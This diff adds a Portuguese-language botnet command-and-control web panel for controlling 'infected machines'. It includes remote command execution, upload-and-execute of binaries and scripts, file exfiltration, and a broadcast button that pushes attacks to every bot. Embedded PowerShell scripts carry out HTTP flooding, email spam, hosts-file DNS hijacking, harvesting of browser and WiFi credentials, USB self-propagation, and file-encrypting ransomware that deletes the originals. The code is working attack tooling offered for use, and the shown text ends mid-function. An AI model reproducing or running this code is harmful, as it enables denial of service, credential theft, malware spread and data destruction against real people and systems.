@@ -1,0 +1,1185 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>C2 Panel</title>
+    <script src="https://cdn.jsdelivr.net/npm/pako@2.0.4/dist/pako.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #1a1a1a; color: #0f0; font-family: monospace; padding: 20px; }
+        .container { max-width: 1400px; margin: 0 auto; }
+        .header { margin-bottom: 30px; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
+        
+        .machines-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; }
+        
+        .machine-card { 
+            border: 1px solid #0f0; padding: 15px; background: #0a0a0a; 
+            cursor: pointer; position: relative; min-height: 140px; 
+            display: flex; flex-direction: column; justify-content: space-between; 
+            transition: all 0.3s ease;
+            border-radius: 4px;
+        }
+        
+        .machine-card:hover { 
+            background: #1a2a1a;
+            box-shadow: 0 0 15px rgba(0,255,0,0.4);
+        }
+        
+        .machine-card.favorite { border-color: #ff0; }
+        
+        .card-header { 
+            display: flex; justify-content: space-between; align-items: flex-start; 
+            margin-bottom: 10px;
+        }
+        
+        .card-header-info { flex: 1; }
+        
+        .machine-id { font-weight: bold; color: #0f0; margin-bottom: 5px; font-size: 1em; }
+        .machine-username { font-size: 0.85em; color: #0ff; margin-bottom: 3px; }
+        .machine-ip { font-size: 0.85em; color: #080; }
+        
+        .card-actions { 
+            display: flex; gap: 5px;
+        }
+        
+        .card-btn { 
+            background: none; border: none; font-size: 1.1em; cursor: pointer; 
+            padding: 0; transition: transform 0.2s;
+        }
+        
+        .card-btn:hover { transform: scale(1.3); }
+        
+        .control-section { 
+            margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #111;
+        }
+        
+        .control-section h3 { color: #0f0; margin-bottom: 10px; font-size: 0.95em; }
+        
+        .control-section:last-child { border-bottom: none; }
+        
+        input[type="text"], input[type="file"] { 
+            background: #000; color: #0f0; border: 1px solid #0f0; 
+            padding: 8px; width: 100%; margin-bottom: 8px; border-radius: 2px;
+        }
+        
+        input[type="text"]:focus, input[type="file"]:focus { 
+            outline: none; box-shadow: 0 0 10px rgba(0,255,0,0.5);
+        }
+        
+        button { 
+            cursor: pointer; background: #0f0; color: #000; border: none; 
+            padding: 8px 12px; font-weight: bold; border-radius: 2px;
+            transition: all 0.2s;
+        }
+        
+        button:hover { background: #00ff00; transform: scale(1.02); }
+        
+        .output-box { 
+            background: #000; border: 1px solid #0f0; padding: 10px; 
+            height: 100px; overflow-y: auto; font-size: 0.8em; margin-top: 8px;
+            border-radius: 2px;
+        }
+        
+        .progress { background: #000; border: 1px solid #0f0; padding: 5px; margin-top: 5px; display: none; }
+        .progress.show { display: block; }
+        .progress-bar { width: 100%; height: 20px; background: #000; border: 1px solid #0f0; position: relative; }
+        .progress-fill { height: 100%; background: #0f0; width: 0%; transition: width 0.3s; }
+        
+        #terminal { 
+            background: #000; height: 250px; overflow-y: auto; 
+            border: 1px solid #0f0; padding: 10px; margin-top: 20px;
+        }
+        
+        .log-entry { margin-bottom: 5px; font-size: 0.85em; }
+        .log-entry.success { color: #0f0; }
+        .log-entry.error { color: #f00; }
+        .log-entry.info { color: #0ff; }
+        
+        .modal { 
+            display: none; position: fixed; z-index: 1000; 
+            left: 0; top: 0; width: 100%; height: 100%; 
+            background-color: rgba(0,0,0,0.95); pointer-events: none;
+            overflow-y: auto;
+        }
+        
+        .modal.show { 
+            display: flex; align-items: flex-start; justify-content: center; 
+            pointer-events: auto; padding-top: 20px;
+        }
+        
+        .modal-content { 
+            background: #0a0a0a; border: 2px solid #0f0; border-radius: 8px; 
+            padding: 25px; max-width: 700px; width: 95%; 
+            box-shadow: 0 0 20px rgba(0,255,0,0.3); pointer-events: auto;
+        }
+        
+        .modal-header { 
+            display: flex; justify-content: space-between; align-items: center; 
+            margin-bottom: 20px; border-bottom: 1px solid #0f0; padding-bottom: 15px;
+        }
+        
+        .modal-header h2 { color: #0f0; margin: 0; word-break: break-word; }
+        
+        .modal-close { 
+            background: #f00; color: #fff; border: none; padding: 5px 10px; 
+            cursor: pointer; font-weight: bold; flex-shrink: 0;
+        }
+        
+        .modal-close:hover { background: #ff0000; }
+        
+        .modal-body { max-height: 70vh; overflow-y: auto; }
+        
+        .info-section { 
+            background: #000; border: 1px solid #0f0; padding: 15px;
+            margin-bottom: 15px; border-radius: 4px; display: none;
+        }
+        
+        .info-section.show { display: block; }
+        
+        .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #111; }
+        .info-row .label { color: #0ff; font-weight: bold; min-width: 130px; }
+        .info-row .value { color: #0f0; word-break: break-all; text-align: right; flex: 1; margin-left: 10px; }
+        
+        .files-section { margin-top: 15px; }
+        .file-item { background: #000; border: 1px solid #0f0; padding: 10px; margin: 10px 0; border-radius: 4px; font-size: 0.9em; }
+        .file-name { color: #0f0; font-weight: bold; }
+        .file-info { color: #0ff; font-size: 0.85em; margin-top: 3px; }
+        
+        
+        .rename-modal { display: none; position: fixed; z-index: 1001; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.95); }
+        .rename-modal.show { display: flex; align-items: center; justify-content: center; }
+        .rename-content { background: #0a0a0a; border: 2px solid #0f0; padding: 20px; width: 90%; max-width: 400px; }
+        .rename-content h3 { color: #0f0; margin-bottom: 15px; }
+        .rename-content input { width: 100%; margin-bottom: 10px; }
+        .rename-buttons { display: flex; gap: 10px; }
+        .rename-buttons button { flex: 1; }
+
+        .attack-section { 
+            background: #1a0000; border: 2px solid #f00; padding: 15px; 
+            margin-bottom: 20px; border-radius: 4px;
+        }
+        
+        .attack-section h3 { color: #f00; margin-bottom: 15px; }
+        
+        .checkbox-grid { 
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); 
+            gap: 10px; margin-bottom: 15px;
+        }
+        
+        .checkbox-item { 
+            display: flex; align-items: center; gap: 8px; 
+            background: #0a0000; padding: 10px; border: 1px solid #ff3333; border-radius: 3px;
+        }
+        
+        .checkbox-item input[type="checkbox"] { cursor: pointer; width: 18px; height: 18px; }
+        .checkbox-item label { cursor: pointer; flex: 1; color: #ff9999; }
+        
+        .attack-params { 
+            background: #0a0000; border: 1px solid #ff3333; padding: 12px; 
+            margin-bottom: 15px; border-radius: 3px; display: none;
+        }
+        
+        .attack-params.show { display: block; }
+        
+        .attack-params input { 
+            background: #000; color: #ff9999; border: 1px solid #ff3333; 
+            padding: 6px; width: 100%; margin: 5px 0; border-radius: 2px;
+        }
+        
+        .attack-buttons { 
+            display: flex; gap: 10px; justify-content: space-between;
+        }
+        
+        .attack-buttons button { 
+            flex: 1; background: #f00; color: #fff; font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .attack-buttons button:hover { background: #ff3333; transform: scale(1.05); }
+        .attack-buttons button.macro { background: #cc0000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h2>🖥️ C2 Command & Control Panel</h2>
+            <p>Gerenciamento de máquinas infectadas</p>
+        </div>
+        <div class="machines-grid" id="machines"></div>
+    </div>
+
+    <div id="terminal">--- Logs do Sistema ---<br></div>
+
+    <div id="controlModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 id="modalTitle">Máquina</h2>
+                <button class="modal-close" onclick="closeModal()">✕</button>
+            </div>
+            <div id="modalBody" class="modal-body"></div>
+        </div>
+    </div>
+
+    <div class="rename-modal" id="renameModal">
+        <div class="rename-content">
+            <h3>Renomear Máquina</h3>
+            <input type="text" id="newNameInput" placeholder="Novo nome...">
+            <div class="rename-buttons">
+                <button onclick="saveCustomName()">💾 Salvar</button>
+                <button onclick="closeRenameModal()" style="background: #666;">❌ Cancelar</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const log = (msg, type = 'info') => {
+            const terminal = document.getElementById('terminal');
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            terminal.appendChild(entry);
+            terminal.scrollTop = terminal.scrollHeight;
+        };
+
+        const resultados = {};
+        const customNames = {};
+        const favorites = new Set();
+        let currentMachineId = null;
+        let downloadWS = null;
+        let downloadChunks = {};
+
+        // Conectar ao WebSocket para escutar downloads
+        function initDownloadWebSocket() {
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = `${protocol}//${window.location.host}`;
+            
+            downloadWS = new WebSocket(wsUrl);
+            
+            downloadWS.onopen = () => {
+                console.log('[WS] Conectado para escutar downloads');
+            };
+            
+            downloadWS.onmessage = (event) => {
+                try {
+                    const message = JSON.parse(event.data);
+                    
+                    if (message.type === 'download_start') {
+                        const downloadId = `${message.machineId}_${message.filename}`;
+                        downloadChunks[downloadId] = {
+                            chunks: [],
+                            totalChunks: message.totalChunks,
+                            filename: message.filename,
+                            originalPath: message.originalPath,
+                            machineId: message.machineId
+                        };
+                        log(`📥 Download iniciado: ${message.filename} (${message.totalChunks} chunks)`, 'info');
+                    } 
+                    else if (message.type === 'download_chunk') {
+                        const downloadId = `${message.machineId}_${message.filename}`;
+                        if (downloadChunks[downloadId]) {
+                            const chunkBuffer = Uint8Array.from(atob(message.data), c => c.charCodeAt(0));
+                            downloadChunks[downloadId].chunks.push(chunkBuffer);
+                            const progress = Math.round((downloadChunks[downloadId].chunks.length / downloadChunks[downloadId].totalChunks) * 100);
+                            log(`📥 Chunk ${downloadChunks[downloadId].chunks.length}/${downloadChunks[downloadId].totalChunks} (${progress}%)`, 'info');
+                        }
+                    } 
+                    else if (message.type === 'download_end') {
+                        const downloadId = `${message.machineId}_${message.filename}`;
+                        if (downloadChunks[downloadId]) {
+                            finishDownload(downloadId);
+                            delete downloadChunks[downloadId];
+                        }
+                    }
+                } catch (e) {
+                    // Mensagens que não são JSON são ignoradas
+                }
+            };
+            
+            downloadWS.onerror = (err) => {
+                console.error('[WS] Erro:', err);
+            };
+            
+            downloadWS.onclose = () => {
+                console.log('[WS] Desconectado, reconectando em 3s...');
+                setTimeout(initDownloadWebSocket, 3000);
+            };
+        }
+        
+        // Descomprimir e fazer download
+        function finishDownload(downloadId) {
+            const downloadData = downloadChunks[downloadId];
+            
+            try {
+                // Concatenar todos os chunks
+                const totalLength = downloadData.chunks.reduce((sum, chunk) => sum + chunk.length, 0);
+                const compressed = new Uint8Array(totalLength);
+                let offset = 0;
+                downloadData.chunks.forEach(chunk => {
+                    compressed.set(chunk, offset);
+                    offset += chunk.length;
+                });
+                
+                log(`🔐 Descompactando ${downloadData.filename} (${compressed.length} bytes)...`, 'info');
+                
+                // Descomprimir com pako
+                const decompressed = pako.ungzip(compressed);
+                
+                // Converter para Blob e fazer download
+                const blob = new Blob([decompressed], { type: 'application/octet-stream' });
+                const url = URL.createObjectURL(blob);
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = downloadData.filename;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                URL.revokeObjectURL(url);
+                
+                log(`✓ Download concluído: ${downloadData.filename} (${decompressed.length} bytes)`, 'success');
+            } catch (err) {
+                log(`✗ Erro ao processar arquivo: ${err.message}`, 'error');
+            }
+        }
+
+        function loadCustomData() {
+            const saved = localStorage.getItem('c2_customNames');
+            if (saved) Object.assign(customNames, JSON.parse(saved));
+            
+            const savedFavs = localStorage.getItem('c2_favorites');
+            if (savedFavs) JSON.parse(savedFavs).forEach(id => favorites.add(id));
+        }
+
+        function saveCustomData() {
+            localStorage.setItem('c2_customNames', JSON.stringify(customNames));
+            localStorage.setItem('c2_favorites', JSON.stringify(Array.from(favorites)));
+        }
+
+        async function fetchMachines() {
+            try {
+                const res = await fetch('/machines-detailed');
+                const data = await res.json();
+                const container = document.getElementById('machines');
+                const currentIds = new Set(data.map(m => m.id));
+
+                const existingCards = container.querySelectorAll('.machine-card');
+                existingCards.forEach(card => {
+                    const id = card.getAttribute('data-id');
+                    if (!currentIds.has(id)) card.remove();
+                });
+
+                data.forEach(m => {
+                    const cardId = `card-${m.id}`;
+                    if (!document.getElementById(cardId)) {
+                        const username = m.info?.username || 'Unknown';
+                        const hostname = m.info?.hostname || 'Unknown';
+                        const ipLocal = m.info?.ipAddress || 'N/A';
+                        const displayName = customNames[m.id] || hostname;
+                        
+                        resultados[m.id] = '';
+                        
+                        const div = document.createElement('div');
+                        div.className = 'machine-card';
+                        div.id = cardId;
+                        div.setAttribute('data-id', m.id);
+                        div.setAttribute('data-username', username);
+                        div.setAttribute('data-iplocal', ipLocal);
+                        div.setAttribute('data-hostname', hostname);
+                        
+                        if (favorites.has(m.id)) {
+                            div.classList.add('favorite');
+                        }
+                        
+                        div.innerHTML = `
+                            <div class="card-header">
+                                <div class="card-header-info">
+                                    <div class="machine-id">${displayName}</div>
+                                    <div class="machine-username">👤 ${username}</div>
+                                    <div class="machine-ip">🌐 ${ipLocal}</div>
+                                </div>
+                                <div class="card-actions">
+                                    <button class="card-btn" onclick="event.stopPropagation(); openRenameModal('${m.id}')">✏️</button>
+                                    <button class="card-btn" onclick="event.stopPropagation(); toggleFavorite('${m.id}')">⭐</button>
+                                </div>
+                            </div>
+                        `;
+                        
+                        div.onclick = () => openModal(m.id);
+                        container.appendChild(div);
+                    } else {
+                        const card = document.getElementById(cardId);
+                        const username = m.info?.username || 'Unknown';
+                        const ipLocal = m.info?.ipAddress || 'N/A';
+                        const displayName = customNames[m.id] || m.info?.hostname || 'Unknown';
+                        
+                        card.setAttribute('data-username', username);
+                        card.setAttribute('data-iplocal', ipLocal);
+                        const nameEl = card.querySelector('.machine-id');
+                        if (nameEl) nameEl.textContent = displayName;
+                        const userEl = card.querySelector('.machine-username');
+                        if (userEl) userEl.textContent = `👤 ${username}`;
+                        const ipEl = card.querySelector('.machine-ip');
+                        if (ipEl) ipEl.textContent = `🌐 ${ipLocal}`;
+                    }
+                });
+            } catch (e) {
+                log(`Erro ao buscar máquinas: ${e.message}`, 'error');
+            }
+        }
+
+        function openModal(machineId) {
+            currentMachineId = machineId;
+            const card = document.getElementById(`card-${machineId}`);
+            const machineName = card.querySelector('.machine-id').textContent;
+            const username = card.getAttribute('data-username');
+            
+            const html = `
+                <div class="attack-section">
+                    <h3>⚔️ MENU DE ATAQUES</h3>
+                    
+                    <div class="checkbox-grid">
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="atk-http" value="http">
+                            <label for="atk-http">🌐 HTTP Flood</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="atk-email" value="email">
+                            <label for="atk-email">📧 Email Spam</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="atk-dns" value="dns">
+                            <label for="atk-dns">🔴 DNS Hijack</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="atk-port" value="port">
+                            <label for="atk-port">🔍 Port Scan</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="atk-cred" value="cred">
+                            <label for="atk-cred">🔐 Steal Creds</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="atk-usb" value="usb">
+                            <label for="atk-usb">💾 USB Spread</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="atk-ransom" value="ransom">
+                            <label for="atk-ransom">🔒 Encrypt Files</label>
+                        </div>
+                    </div>
+                    
+                    <div class="attack-params" id="attack-params">
+                        <h4 style="color: #ff9999; margin-bottom: 10px;">⚙️ Parâmetros</h4>
+                        <input type="text" id="atk-target" placeholder="Alvo (URL, IP, domínio)">
+                        <input type="text" id="atk-email-target" placeholder="Email alvo (para spam)">
+                        <input type="text" id="atk-email-smtp" placeholder="SMTP (ex: smtp.gmail.com)">
+                        <input type="text" id="atk-email-from" placeholder="Email remetente">
+                        <input type="password" id="atk-email-pass" placeholder="Senha SMTP">
+                        <input type="number" id="atk-threads" placeholder="Número de threads (padrão: 10)" value="10">
+                    </div>
+                    
+                    <div class="attack-buttons">
+                        <button onclick="startAttack('${machineId}', false)">▶️ Atacar Esta Máquina</button>
+                        <button class="macro" onclick="startAttack('${machineId}', true)">🌍 Atacar TODAS as Máquinas</button>
+                    </div>
+                    
+                    <div class="control-section">
+                        <h3>📁 Enviar & Executar Arquivo Customizado</h3>
+                        <input type="file" id="custom-file-${machineId}" accept=".bat,.ps1,.exe">
+                        <button onclick="uploadCustom('${machineId}')">⬆️ Upload & Execute</button>
+                        <div class="progress" id="custom-progress-${machineId}">
+                            <div class="progress-bar">
+                                <div class="progress-fill" id="custom-fill-${machineId}"></div>
+                            </div>
+                            <span id="custom-text-${machineId}" style="font-size: 0.85em;">0%</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="control-section">
+                    <h3>📝 Executar Comando</h3>
+                    <input type="text" id="cmd-${machineId}" placeholder="Ex: dir, whoami, ipconfig..." value="dir" autofocus>
+                    <button onclick="sendCmd('${machineId}')">▶️ Executar</button>
+                    <div class="output-box" id="output-${machineId}">Aguardando comando...</div>
+                </div>
+                
+                <div class="control-section">
+                    <h3>📤 Upload de Arquivo</h3>
+                    <input type="file" id="file-${machineId}">
+                    <button onclick="uploadFile('${machineId}')">⬆️ Upload</button>
+                    <div class="progress" id="progress-${machineId}">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="fill-${machineId}"></div>
+                        </div>
+                        <span id="progress-text-${machineId}" style="font-size: 0.85em;">0%</span>
+                    </div>
+                </div>
+                
+                <div class="control-section">
+                    <h3>⬇️ Download de Arquivo</h3>
+                    <input type="text" id="download-${machineId}" placeholder="Ex: C:\\Users\\Admin\\file.txt">
+                    <button onclick="requestFile('${machineId}')">⬇️ Download</button>
+                </div>
+                
+                <div class="control-section">
+                    <button onclick="showMachineInfo('${machineId}')" style="width: 100%; background: #0ff; color: #000;">📊 Ver Informações do Sistema</button>
+                    <div class="info-section" id="info-${machineId}"></div>
+                </div>
+            `;
+            
+            document.getElementById('modalTitle').textContent = `${machineName} (${username})`;
+            document.getElementById('modalBody').innerHTML = html;
+            document.getElementById('controlModal').classList.add('show');
+            
+            // Setup checkbox listeners
+            setupAttackCheckboxes();
+            
+            // Focus no input de comando
+            setTimeout(() => {
+                const cmdInput = document.getElementById(`cmd-${machineId}`);
+                if (cmdInput) cmdInput.focus();
+            }, 100);
+        }
+
+        function closeModal() {
+            document.getElementById('controlModal').classList.remove('show');
+        }
+
+        function setupAttackCheckboxes() {
+            const attacks = ['http', 'email', 'dns', 'port', 'cred', 'usb', 'ransom'];
+            const paramsDiv = document.getElementById('attack-params');
+            
+            attacks.forEach(atk => {
+                const checkbox = document.getElementById(`atk-${atk}`);
+                if (checkbox) {
+                    checkbox.addEventListener('change', () => {
+                        const anyChecked = attacks.some(a => 
+                            document.getElementById(`atk-${a}`)?.checked
+                        );
+                        if (anyChecked) {
+                            paramsDiv.classList.add('show');
+                        } else {
+                            paramsDiv.classList.remove('show');
+                        }
+                    });
+                }
+            });
+        }
+
+        function getAttackScript(attackType, params) {
+            const target = params.target || 'http://example.com';
+            const threads = params.threads || 10;
+            const emailTarget = params.emailTarget || 'target@example.com';
+            const smtpServer = params.smtpServer || 'smtp.gmail.com';
+            const smtpFrom = params.smtpFrom || 'sender@example.com';
+            const smtpPass = params.smtpPass || 'password';
+            
+            const scripts = {
+                http: `
+# HTTP Flood Attack
+for($i=0;$i -lt ${threads}*100;$i++){
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Start-Job -ScriptBlock {
+        try {
+            $web = New-Object System.Net.WebClient
+            $web.DownloadString("${target}")
+        } catch { }
+    }
+}
+Write-Host "HTTP Flood iniciado contra ${target}"
+`,
+                email: `
+# Email Spam Attack
+[Net.ServicePointManager]::DefaultConnectionLimit = 10
+$smtp = New-Object Net.Mail.SmtpClient("${smtpServer}", 587)
+$smtp.EnableSsl = $true
+$smtp.Credentials = New-Object System.Management.Automation.PSCredential("${smtpFrom}", (ConvertTo-SecureString "${smtpPass}" -AsPlainText -Force))
+for($i=0;$i -lt ${threads}*50;$i++){
+    try {
+        $mail = New-Object System.Net.Mail.MailMessage("${smtpFrom}", "${emailTarget}")
+        $mail.Subject = "Spam $i"
+        $mail.Body = "Mensagem spam automática $i"
+        $smtp.Send($mail)
+        $mail.Dispose()
+    } catch { }
+}
+Write-Host "Email spam enviado para ${emailTarget}"
+`,
+                dns: `
+# DNS Hijacking via Hosts File
+$hostsFile = "C:\\Windows\\System32\\drivers\\etc\\hosts"
+$entries = @(
+    "127.0.0.1 google.com",
+    "127.0.0.1 facebook.com",
+    "127.0.0.1 youtube.com",
+    "127.0.0.1 twitter.com",
+    "127.0.0.1 instagram.com"
+)
+try {
+    foreach($entry in $entries) {
+        If (-not (Select-String -Path $hostsFile -Pattern $entry.Split()[1] -Quiet)) {
+            Add-Content -Path $hostsFile -Value $entry
+        }
+    }
+    Write-Host "DNS hijacking aplicado"
+} catch {
+    Write-Host "Erro: $_"
+}
+`,
+                port: `
+# Port Scanning
+$target = "${target}"
+$ports = @(21,22,23,25,53,80,110,143,443,445,3306,3389,5432,8080,8443,9200)
+$openPorts = @()
+foreach($port in $ports) {
+    try {
+        $tcp = New-Object System.Net.Sockets.TcpClient
+        $tcp.ConnectAsync($target, $port).Wait(500)
+        if($tcp.Connected) {
+            $openPorts += $port
+            Write-Host "Porta $port aberta"
+        }
+        $tcp.Dispose()
+    } catch { }
+}
+Write-Host "Scan concluído. Portas abertas: $($openPorts -join ', ')"
+`,
+                cred: `
+# Credential Harvesting
+$credential = Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -ErrorAction SilentlyContinue
+$credPath = "$env:APPDATA\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+if(Test-Path $credPath) {
+    Write-Host "Chrome credentials encontrados"
+}
+try {
+    $wiFiProfiles = netsh wlan show profile | Select-String ":" | ForEach-Object { $_.Split(":")[1].Trim() }
+    foreach($profile in $wiFiProfiles) {
+        $wiFiPass = netsh wlan show profile "$profile" key=clear | Select-String "Chave de Segurança"
+        Write-Host "WiFi: $profile - $wiFiPass"
+    }
+} catch { }
+Write-Host "Credential harvest concluído"
+`,
+                usb: `
+# USB Spreading
+$usbDrives = Get-Volume | Where-Object { $_.DriveType -eq 'Removable' }
+foreach($drive in $usbDrives) {
+    $path = $drive.Name + ":\\"
+    if(Test-Path $path) {
+        Copy-Item -Path $PSCommandPath -Destination "$path\\malware.ps1" -Force -ErrorAction SilentlyContinue
+        Copy-Item -Path $PSCommandPath -Destination "$path\\update.bat" -Force -ErrorAction SilentlyContinue
+        Write-Host "Copiado para $path"
+    }
+}
+Write-Host "USB spreading concluído"
+`,
+                ransom: `
+# File Encryption Ransomware
+$targetFolders = @(
+    "$env:USERPROFILE\\Documents",
+    "$env:USERPROFILE\\Pictures",
+    "$env:USERPROFILE\\Desktop"
+)
+$password = "RansomKey123"
+try {
+    foreach($folder in $targetFolders) {
+        if(Test-Path $folder) {
+            Get-ChildItem -Path $folder -Recurse -File | Where-Object { $_.Extension -in '.txt', '.doc', '.docx', '.pdf', '.xls' } | ForEach-Object {
+                try {
+                    $content = [System.IO.File]::ReadAllBytes($_.FullName)
+                    $key = [System.Text.Encoding]::UTF8.GetBytes($password.PadRight(32).Substring(0, 32))
+                    $cipher = New-Object System.Security.Cryptography.AesManaged
+                    $cipher.Key = $key
+                    $encryptor = $cipher.CreateEncryptor($cipher.Key, $cipher.IV)
+                    $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)
+                    [System.IO.File]::WriteAllBytes($_.FullName + ".encrypted", $cipher.IV + $encrypted)
+                    Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
+                } catch { }
+            }
+        }
+    }
+    Write-Host "Arquivos criptografados"
+} catch {
+    Write-Host "Erro: $_"
+}
+`
+            };
+            
+            return scripts[attackType] || "Write-Host 'Ataque desconhecido'";
+        }
+
+        async function startAttack(machineId, isMacro) {
+            const selectedAttacks = [];
+            ['http', 'email', 'dns', 'port', 'cred', 'usb', 'ransom'].forEach(atk => {
+                if (document.getElementById(`atk-${atk}`)?.checked) {
+                    selectedAttacks.push(atk);
+                }
+            });
+            
+            if (selectedAttacks.length === 0) {
+                log('❌ Selecione pelo menos um ataque', 'error');
+                return;
+            }
+            
+            const params = {
+                target: document.getElementById('atk-target')?.value || 'http://example.com',
+                emailTarget: document.getElementById('atk-email-target')?.value || 'target@example.com',
+                smtpServer: document.getElementById('atk-email-smtp')?.value || 'smtp.gmail.com',
+                smtpFrom: document.getElementById('atk-email-from')?.value || 'sender@example.com',
+                smtpPass: document.getElementById('atk-email-pass')?.value || 'password',
+                threads: parseInt(document.getElementById('atk-threads')?.value || 10)
+            };
+            
+            let combinedScript = "# BOTNET ATTACK SCRIPT\n\n";
+            selectedAttacks.forEach(atk => {
+                combinedScript += getAttackScript(atk, params) + "\n\n";
+            });
+            
+            const targets = isMacro ? 'TODAS as máquinas' : machineId.substring(0, 8);
+            log(`⚔️ Iniciando ataques: ${selectedAttacks.join(', ')} contra ${targets}`, 'info');
+            
+            if (isMacro) {
+                try {
+                    const res = await fetch('/broadcast-attack', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ script: combinedScript, attacks: selectedAttacks })
+                    });
+                    
+                    if (res.ok) {
+                        log(`✓ Ataque distribuído para TODAS as máquinas`, 'success');
+                    } else {
+                        log(`✗ Erro ao distribuir ataque`, 'error');
+                    }
+                } catch (e) {
+                    log(`Erro: ${e.message}`, 'error');
+                }
+            } else {
+                try {
+                    const res = await fetch('/command', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ 
+                            idMachine: machineId, 
+                            command: combinedScript, 
+                            type: 'execute-script',
+                            isAttack: true
+                        })
+                    });
+                    
+                    if (res.ok) {
+                        log(`✓ Ataque enviado para máquina`, 'success');
+                    } else {
+                        log(`✗ Máquina offline`, 'error');
+                    }
+                } catch (e) {
+                    log(`Erro: ${e.message}`, 'error');
+                }
+            }
+        }
+
+        async function uploadCustom(machineId) {
+            const fileInput = document.getElementById(`custom-file-${machineId}`);
+            const file = fileInput?.files[0];
+            
+            if (!file) {
+                log(`Nenhum arquivo selecionado`, 'error');
+                return;
+            }
+
+            const isExecutable = file.name.endsWith('.exe') || file.name.endsWith('.ps1') || file.name.endsWith('.bat');
+            if (!isExecutable) {
+                log(`Arquivo deve ser .bat, .ps1 ou .exe`, 'error');
+                return;
+            }
+
+            log(`⬆ Enviando ${file.name} para execução...`, 'info');
+            
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('idMachine', machineId);
+            formData.append('execute', 'true');
+
+            const progressDiv = document.getElementById(`custom-progress-${machineId}`);
+            const progressFill = document.getElementById(`custom-fill-${machineId}`);
+            const progressText = document.getElementById(`custom-text-${machineId}`);
+            progressDiv.classList.add('show');
+
+            try {
+                const xhr = new XMLHttpRequest();
+                
+                xhr.upload.addEventListener('progress', (e) => {
+                    if (e.lengthComputable) {
+                        const pct = Math.round((e.loaded / e.total) * 100);
+                        progressFill.style.width = pct + '%';
+                        progressText.textContent = pct + '%';
+                    }
+                });
+
+                xhr.addEventListener('load', () => {
+                    if (xhr.status === 200) {
+                        log(`✓ ${file.name} executado`, 'success');
+                        progressDiv.classList.remove('show');
+                        fileInput.value = '';
+                    } else {
+                        log(`✗ Erro na execução`, 'error');
+                    }
+                });
+
+                xhr.addEventListener('error', () => {
+                    log(`Erro na conexão`, 'error');
+                });
+
+                xhr.open('POST', `/upload?idMachine=${encodeURIComponent(machineId)}&execute=true`);
+                xhr.send(formData);
+            } catch (e) {
+                log(`Erro: ${e.message}`, 'error');
+            }
+        }
+
+        function openRenameModal(machineId) {
+            currentMachineId = machineId;
+            const card = document.getElementById(`card-${machineId}`);
+            const currentName = card.querySelector('.machine-id').textContent;
+            document.getElementById('newNameInput').value = currentName;
+            document.getElementById('renameModal').classList.add('show');
+        }
+
+        function closeRenameModal() {
+            document.getElementById('renameModal').classList.remove('show');
+        }
+
+        function saveCustomName() {
+            const newName = document.getElementById('newNameInput').value.trim();
+            if (newName && currentMachineId) {
+                customNames[currentMachineId] = newName;
+                saveCustomData();
+                const card = document.getElementById(`card-${currentMachineId}`);
+                card.querySelector('.machine-id').textContent = newName;
+                closeRenameModal();
+                log(`Máquina renomeada para: ${newName}`, 'success');
+                
+                // Atualizar título do modal se estiver aberto
+                const modalTitle = document.getElementById('modalTitle');
+                if (modalTitle) {
+                    const parts = modalTitle.textContent.split(' (');
+                    if (parts.length > 1) {
+                        modalTitle.textContent = `${newName} (${parts[1]}`;
+                    }
+                }
+            }
+        }
+
+        function toggleFavorite(machineId) {
+            const card = document.getElementById(`card-${machineId}`);
+            if (favorites.has(machineId)) {
+                favorites.delete(machineId);
+                card.classList.remove('favorite');
+            } else {
+                favorites.add(machineId);
+                card.classList.add('favorite');
+            }
+            saveCustomData();
+        }
+
+        async function sendCmd(id) {
+            const cmdInput = document.getElementById(`cmd-${id}`);
+            const command = cmdInput.value.trim();
+            
+            if (!command) {
+                log(`Comando vazio para ${id.substring(0, 8)}`, 'error');
+                return;
+            }
+
+            log(`Enviando: "${command}" → ${id.substring(0, 8)}`, 'info');
+            const outputBox = document.getElementById(`output-${id}`);
+            outputBox.textContent = '⏳ Aguardando resposta...';
+
+            try {
+                const res = await fetch('/command', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ idMachine: id, command, type: 'exec' })
+                });
+                
+                if (res.ok) {
+                    log(`✓ Comando enviado`, 'success');
+                } else {
+                    log(`✗ Máquina offline`, 'error');
